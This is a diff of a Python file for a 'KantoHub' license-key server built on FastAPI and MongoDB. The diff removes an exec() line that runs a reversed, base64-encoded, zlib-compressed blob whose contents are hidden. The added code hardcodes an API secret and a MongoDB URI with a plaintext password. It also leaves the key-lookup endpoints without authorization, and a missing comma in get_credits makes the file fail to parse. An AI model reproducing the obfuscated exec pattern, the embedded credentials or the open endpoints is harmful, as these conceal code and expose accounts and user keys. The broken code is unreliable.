@@ -1,2 +1,327 @@
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));
-exec((_)(b'=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'))
+from fastapi import FastAPI, Request, Header
+from fastapi.responses import JSONResponse
+from pymongo import MongoClient, ReturnDocument
+from datetime import datetime, timedelta
+import os
+
+API_SECRET = os.getenv("API_SECRET", "kantohub_super_secret_key_6919601061")
+
+MONGO_URI = os.getenv(
+    "MONGO_URI",
+    "mongodb+srv://kantohub:SUemxBr7P9LuMaZ@cluster0.ymqrtsw.mongodb.net/?appName=Cluster0"
+)
+
+client = MongoClient(MONGO_URI)
+db = client["kantohub"]
+keys_col = db["licenses"]
+credits_col = db["credits"]
+stock_col = db["stock"]
+
+app = FastAPI()
+
+DURATION_MAP = {
+    "3days": timedelta(days=3),
+    "1week": timedelta(weeks=1),
+    "1month": timedelta(days=30),
+    "permanent": None
+}
+
+# INIT STOCK
+stock_col.update_one(
+    {"name": "global"},
+    {"$setOnInsert": {"credits": 0}},
+    upsert=True
+)
+
+# ================= UTILS =================
+
+def authorized(auth: str):
+    if not auth:
+        return False
+    if auth.startswith("Bearer "):
+        auth = auth.replace("Bearer ", "")
+    return auth == API_SECRET
+
+def is_expired(k):
+    if k["expires_at"] is None:
+        return False
+    return datetime.utcnow() > k["expires_at"]
+
+@app.get("/")
+def root():
+    return {"status": "KantoHub License API Online XD;*"}
+
+@app.post("/api/add-key")
+async def add_key(req: Request, authorization: str = Header(None)):
+    if not authorized(authorization):
+        return JSONResponse({"error": "unauthorized"}, status_code=403)
+
+    data = await req.json()
+
+    duration = data.get("duration", "permanent")
+    expires_at = None
+    if duration in DURATION_MAP and DURATION_MAP[duration]:
+        expires_at = datetime.utcnow() + DURATION_MAP[duration]
+
+    key_value = data["key"]
+
+    keys_col.insert_one({
+        "system_name": data["system_name"],
+        "placeid": str(data["placeid"]),
+        "key": key_value,
+        "server_name": data["server_name"],
+        "assigned_to": data["assigned_to"],
+        "timestamp_utc": datetime.utcnow(),
+        "expires_at": expires_at,
+        "used": False,
+        "used_placeid": None,
+        "used_at": None
+    })
+    credits_col.update_one(
+        {"user_id": data["assigned_to"]},
+        {"$push": {"generated_keys": data["key"]}}
+    )
+
+    return {"success": True}
+
+@app.post("/api/verify")
+async def verify(req: Request):
+    body = await req.json()
+    key = body.get("key")
+    placeid = str(body.get("placeid"))
+
+    k = keys_col.find_one({"key": key})
+    if not k:
+        return {"success": False, "reason": "invalid_key"}
+
+    if is_expired(k):
+        return {"success": False, "reason": "expired"}
+
+    if k["placeid"] != placeid:
+        return {"success": False, "reason": "wrong_place_id"}
+
+    if not k["used"]:
+        keys_col.update_one(
+            {"_id": k["_id"]},
+            {"$set": {
+                "used": True,
+                "used_placeid": placeid,
+                "used_at": datetime.utcnow()
+            }}
+        )
+
+    return {"success": True}
+
+@app.post("/api/check-key")
+async def check_key(req: Request):
+    body = await req.json()
+    user_id = body.get("user_id")
+
+    keys = keys_col.find({"assigned_to": user_id})
+    result = []
+
+    for k in keys:
+        if not is_expired(k):
+            result.append({
+                "system_name": k["system_name"],
+                "server_name": k["server_name"],
+                "key": k["key"],
+                "expires_at": k["expires_at"].isoformat() if k["expires_at"] else None
+            })
+
+    return {"keys": result}
+
+@app.post("/api/delete-key")
+async def delete_key(req: Request, authorization: str = Header(None)):
+    if not authorized(authorization):
+        return JSONResponse({"error": "unauthorized"}, status_code=403)
+
+    key = (await req.json()).get("key")
+    res = keys_col.delete_one({"key": key})
+
+    if res.deleted_count == 0:
+        return JSONResponse({"error": "key_not_found"}, status_code=404)
+
+    return {"success": True}
+
+@app.post("/api/all-keys")
+async def all_keys(authorization: str = Header(None)):
+    if not authorized(authorization):
+        return JSONResponse({"error": "unauthorized"}, status_code=403)
+
+    keys = []
+    for k in keys_col.find():
+        if not is_expired(k):
+            keys.append({
+                "system_name": k["system_name"],
+                "server_name": k["server_name"],
+                "key": k["key"],
+                "placeid": k["placeid"],
+                "assigned_to": k["assigned_to"],
+                "expires_at": k["expires_at"].isoformat() if k["expires_at"] else None,
+                "used": k["used"]
+            })
+
+    return {"keys": keys}
+
+@app.post("/api/stock-credits")
+async def stock_credits(req: Request, authorization: str = Header(None)):
+    if not authorized(authorization):
+        return JSONResponse({"error": "unauthorized"}, status_code=403)
+
+    amount = int((await req.json())["amount"])
+    stock_col.update_one({"name": "global"}, {"$inc": {"credits": amount}})
+    stock = stock_col.find_one({"name": "global"})
+
+    return {"success": True, "stock": stock["credits"]}
+
+@app.post("/api/check-stock")
+async def check_stock(authorization: str = Header(None)):
+    if not authorized(authorization):
+        return JSONResponse({"error": "unauthorized"}, status_code=403)
+
+    stock = stock_col.find_one({"name": "global"}) or {"credits": 0}
+    return {"credits": stock["credits"]}
+
+@app.post("/api/give-credits")
+async def give_credits(req: Request, authorization: str = Header(None)):
+    if not authorized(authorization):
+        return JSONResponse({"error": "unauthorized"}, status_code=403)
+
+    data = await req.json()
+    user_id = data["user_id"]
+    credits = int(data["credits"])
+    keyprefix = data["keyprefix"]
+
+    stock = stock_col.find_one({"name": "global"})
+    if stock["credits"] < credits:
+        return JSONResponse({"error": "not_enough_stock"}, status_code=400)
+
+    stock_col.update_one(
+        {"name": "global"},
+        {"$inc": {"credits": -credits}}
+    )
+
+    credits_col.update_one(
+        {"user_id": user_id},
+        {
+            "$set": {"keyprefix": keyprefix},
+            "$inc": {"credits": credits},
+            "$setOnInsert": {"generated_keys": []}
+        },
+        upsert=True
+    )
+    return {"success": True}
+
+@app.post("/api/use-credit")
+async def use_credit(req: Request, authorization: str = Header(None)):
+    if not authorized(authorization):
+        return JSONResponse({"error": "unauthorized"}, status_code=403)
+
+    data = await req.json()
+    user_id = data["user_id"]
+    keyprefix = data["keyprefix"]
+    user = credits_col.find_one({"user_id": user_id})
+    if not user or user.get("credits", 0) <= 0:
+        return {"success": False, "reason": "no_credits"}
+    if user.get("keyprefix") != keyprefix:
+        return {"success": False, "reason": "invalid_prefix"}
+    credits_col.update_one(
+        {"user_id": user_id},
+        {"$inc": {"credits": -1}}
+    )
+
+    updated = credits_col.find_one({"user_id": user_id})
+    if updated["credits"] <= 0:
+        credits_col.update_one(
+            {"user_id": user_id},
+            {"$unset": {"keyprefix": ""}}
+        )
+
+    return {"success": True}
+
+@app.post("/api/get-credits")
+async def get_credits(req: Request, authorization: str = Header(None)):
+    if not authorized(authorization):
+        return JSONResponse({"error": "unauthorized"}, status_code=403)
+
+    user_id = (await req.json()).get("user_id")
+
+    user = credits_col.find_one({"user_id": user_id})
+    return {
+        "credits": user["credits"] if user else 0
+        "keyprefix": user.get("keyprefix") if user else None
+    }
+
+@app.post("/api/credit-users")
+async def credit_users(authorization: str = Header(None)):
+    if not authorized(authorization):
+        return JSONResponse({"error": "unauthorized"}, status_code=403)
+
+    users = []
+    for u in credits_col.find():
+        users.append({
+            "user_id": u["user_id"],
+            "credits": u.get("credits", 0),
+            "keyprefix": u.get("keyprefix"),
+            "generated_keys": u.get("generated_keys", [])
+        })
+
+    return {"users": users}
+
+@app.post("/api/add-credits")
+async def add_credits(req: Request, authorization: str = Header(None)):
+    if not authorized(authorization):
+        return JSONResponse({"error": "unauthorized"}, status_code=403)
+
+    data = await req.json()
+    user_id = data["user_id"]
+    amount = int(data["credits"])
+
+    if amount <= 0:
+        return {"success": False, "reason": "invalid_amount"}
+
+    credits_col.update_one(
+        {"user_id": user_id},
+        {"$inc": {"credits": amount}},
+        upsert=True
+    )
+
+    user = credits_col.find_one({"user_id": user_id})
+    return {
+        "success": True,
+        "credits": user["credits"]
+    }
+
+@app.post("/api/revoke-credits")
+async def revoke_credits(req: Request, authorization: str = Header(None)):
+    if not authorized(authorization):
+        return JSONResponse({"error": "unauthorized"}, status_code=403)
+
+    data = await req.json()
+    user_id = data["user_id"]
+    amount = int(data["credits"])
+
+    user = credits_col.find_one({"user_id": user_id})
+    if not user:
+        return {"success": False, "reason": "no_user"}
+
+    if user.get("credits", 0) < amount:
+        return {"success": False, "reason": "not_enough_credits"}
+
+    credits_col.update_one(
+        {"user_id": user_id},
+        {"$inc": {"credits": -amount}}
+    )
+
+    updated = credits_col.find_one({"user_id": user_id})
+    if updated["credits"] <= 0:
+        credits_col.update_one(
+            {"user_id": user_id},
+            {"$unset": {"keyprefix": ""}}
+        )
+
+    return {
+        "success": True,
+        "credits": updated["credits"]
+    }
